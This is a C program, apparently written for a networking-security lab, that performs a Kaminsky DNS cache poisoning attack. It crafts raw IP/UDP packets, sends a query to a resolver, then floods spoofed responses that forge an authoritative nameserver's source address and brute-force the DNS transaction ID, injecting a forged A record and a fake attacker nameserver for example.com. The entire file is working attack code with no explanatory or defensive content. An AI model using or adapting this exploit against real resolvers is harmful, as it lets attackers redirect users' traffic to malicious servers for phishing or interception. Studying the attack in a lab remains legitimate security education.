#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

#define PACKET_LEN 8192
#define FLAG_Q 0x0100
#define FLAG_R 0x8400

// struct for IP header
struct IPHeader {
    uint8_t header_length: 4, version: 4;
    uint8_t tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
};

// struct for UDP header
struct UDPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t checksum;
};

// struct for DNS header
struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qd_count;
    uint16_t an_count;
    uint16_t ns_count;
    uint16_t ar_count;
};

// struct for Question section of DNS
struct QuestionEnd {
    uint16_t type;
    uint16_t class;
};

// struct for Answer section of DNS
struct AnswerEnd {
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rd_length;
} __attribute__((packed)); // avoid padding

// sizes
const int IP_SIZE = sizeof(struct IPHeader);
const int UDP_SIZE = sizeof(struct UDPHeader);
const int DNS_SIZE = sizeof(struct DNSHeader);
const int Q_END_SIZE = sizeof(struct QuestionEnd);
const int A_END_SIZE = sizeof(struct AnswerEnd);

void printProgress(int percentage) {
    const char *progress = "||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||";
    printf("\r%3d%% [%.*s%*s]", percentage, percentage, progress, 100 - percentage, "");
    fflush(stdout);
}

uint32_t checksum(uint16_t *usBuff, int length) {
    uint32_t sum = 0;
    for (; length > 1; length -= 2) {
        sum += *usBuff++;
    }
    if (length == 1) {
        sum += *(uint16_t *) usBuff;
    }
    return sum;
}

uint16_t check_udp_sum(uint8_t *buffer, int length) {
    struct IPHeader *tempI = (struct IPHeader *) buffer;
    struct UDPHeader *tempH = (struct UDPHeader *) (buffer + IP_SIZE);
    tempH->checksum = 0;
    uint32_t sum = checksum((uint16_t *) &(tempI->src_ip), 8);
    sum += checksum((uint16_t *) tempH, length);
    sum += ntohs(IPPROTO_UDP + length);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += sum >> 16;
    return (uint16_t) ~sum;
}

uint16_t check_ip_sum(uint16_t *buffer, int length) {
    uint32_t sum = 0;
    for (; length > 0; length--)
        sum += *buffer++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t) ~sum;
}

void set_dns_header(struct DNSHeader *dns, int isAnswer) {
    dns->id = rand(); // random id
    if (isAnswer) {
        dns->flags = htons(FLAG_R); // flag of DNS Answer
        dns->qd_count = htons(1); // 1 Question section
        dns->an_count = htons(1); // 1 Answer section
        dns->ns_count = htons(1); // 1 Authority section
        dns->ar_count = htons(1); // 1 Additional section
    } else {
        dns->flags = htons(FLAG_Q); // flag of DNS Question
        dns->qd_count = htons(1); // 1 Question section
    }
}

void set_ip_header(struct IPHeader *ip, uint16_t length, const char *src, const char *dst) {
    ip->header_length = 5; // header length is 5
    ip->version = 4; // 4 for ipv4
    ip->tos = 0; // we don't care ToS
    ip->total_length = htons(length); // set total length
    ip->id = htons(rand()); // random id
    ip->ttl = 110; // TTL is 110
    ip->protocol = IPPROTO_UDP; // protocol is UDP
    ip->src_ip = inet_addr(src); // set src IP
    ip->dst_ip = inet_addr(dst); // set dst IP
    ip->checksum = check_ip_sum((uint16_t *) ip, IP_SIZE + UDP_SIZE); // set checksum
}

void set_udp_header(struct UDPHeader *udp, uint16_t length, uint16_t src, uint16_t dst) {
    udp->src_port = htons(src); // set src port
    udp->dst_port = htons(dst); // set dst port
    udp->length = htons(length); // set length
}

uint16_t set_question(char *data, const char *name) {
    strcpy(data, name); // set name
    size_t length = strlen(name) + 1;
    struct QuestionEnd *end = (struct QuestionEnd *) (data + length);
    end->type = htons(1); // 1 for A record
    end->class = htons(1); // 1 for Internet
    return length + Q_END_SIZE; // return length of section
}

uint16_t set_answer(char *data, const char *name, const char *rdata) {
    strcpy(data, name); // set name
    size_t length = strlen(name) + 1;
    struct AnswerEnd *end = (struct AnswerEnd *) (data + length);
    end->type = htons(1); // 1 for A record
    end->class = htons(1); // 1 for Internet
    end->ttl = htonl(86400); // TTL is 86400
    end->rd_length = htons(4); // set resource data length
    *(uint32_t *) ((char *) end + A_END_SIZE) = inet_addr(rdata); // set resource data
    return length + A_END_SIZE + 4; // return length of section
}

uint16_t set_authority(char *data, const char *name, const char *rdata) {
    strcpy(data, name); // set name
    size_t length = strlen(name) + 1;
    size_t rd_length = strlen(rdata) + 1;
    struct AnswerEnd *end = (struct AnswerEnd *) (data + length);
    end->type = htons(2); // 2 for NS record
    end->class = htons(1); // 1 for Internet
    end->ttl = htonl(86400); // TTL is 86400
    end->rd_length = htons(rd_length); // set resource data length
    strcpy((char *) end + A_END_SIZE, rdata); // set resource data
    return length + A_END_SIZE + rd_length; // return length of section
}

const char *host = "\5aaaaa\7example\3com";
const char *fakeHostIP = "1.2.3.4";
const char *domain = "\7example\3com";
const char *fakeNS = "\2ns\16dnslabattacker\3net";
const char *fakeNSIP = "5.6.7.8";

const char *ianaNSIP = "199.43.135.53";

const char *attackerInternal = "192.168.2.1";
const char *serverInternal = "192.168.3.2";
const char *serverExternal = "192.168.1.108";

int main() {
    // create raw UDP socket
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) {
        printf("socket error\n");
        exit(-1);
    }

    // disable kernel's IP header
    int option = 1;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option)) < 0) {
        printf("error\n");
        close(sd);
        exit(-1);
    }

    // construct DNS request
    struct sockaddr_in req = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = inet_addr(serverInternal)
    };
    uint8_t reqBuf[PACKET_LEN] = {0}; // init with 0s
    uint8_t *reqIP = reqBuf;
    uint8_t *reqUDP = reqIP + IP_SIZE;
    uint8_t *reqDNS = reqUDP + UDP_SIZE;
    uint8_t *reqData = reqDNS + DNS_SIZE;
    set_dns_header((struct DNSHeader *) reqDNS, 0);
    reqData += set_question((char *) reqData, host);
    uint16_t reqSize = reqData - reqBuf;
    reqData = reqDNS + DNS_SIZE; // reset reqData pointer
    set_ip_header((struct IPHeader *) reqIP, reqSize, attackerInternal, serverInternal);
    set_udp_header((struct UDPHeader *) reqUDP, reqSize - IP_SIZE, 40000 + rand() % 10000, 53);

    // construct DNS response
    struct sockaddr_in res = {
        .sin_family = AF_INET,
        .sin_port = htons(33333),
        .sin_addr.s_addr = inet_addr(serverExternal)
    };
    uint8_t resBuf[PACKET_LEN] = {0}; // init with 0s
    uint8_t *resIP = resBuf;
    uint8_t *resUDP = resIP + IP_SIZE;
    uint8_t *resDNS = resUDP + UDP_SIZE;
    uint8_t *resData = resDNS + DNS_SIZE;
    set_dns_header((struct DNSHeader *) resDNS, 1);
    resData += set_question((char *) resData, host);
    uint8_t *resDataAuth = resData;
    resData += set_answer((char *) resData, host, fakeHostIP);
    resData += set_authority((char *) resData, domain, fakeNS);
    resData += set_answer((char *) resData, fakeNS, fakeNSIP);
    uint16_t resSize = resData - resBuf;
    resData = resDNS + DNS_SIZE;  // reset resData pointer
    set_ip_header((struct IPHeader *) resIP, resSize, ianaNSIP, serverExternal);
    set_udp_header((struct UDPHeader *) resUDP, resSize - IP_SIZE, 53, 33333);

    // perform the Kaminsky attack
    for (int try = 0; try < 200; try++) { // try 200 times
        printProgress(try * 100 / 200); // refresh progress bar
        ((struct UDPHeader *) reqUDP)->checksum = check_udp_sum(reqBuf, reqSize - IP_SIZE); // update UDP checksum

        sendto(sd, reqBuf, reqSize, 0, (struct sockaddr *) &req, sizeof(req)); // send request
        for (int id = 0; id < 256; id++) { // bruteforce id of response
            ((struct DNSHeader *) resDNS)->id = htons(id); // update id
            ((struct UDPHeader *) resUDP)->checksum = check_udp_sum(resBuf, resSize - IP_SIZE); // update UDP checksum
            sendto(sd, resBuf, resSize, 0, (struct sockaddr *) &res, sizeof(res)); // send spoofed response
        }
        // update the hostname because the old one is already cached
        int index = 1 + rand() % 5;
        reqData[index] += 1;
        resData[index] += 1;
        resDataAuth[index] += 1;
    }

    // clean up
    close(sd);
}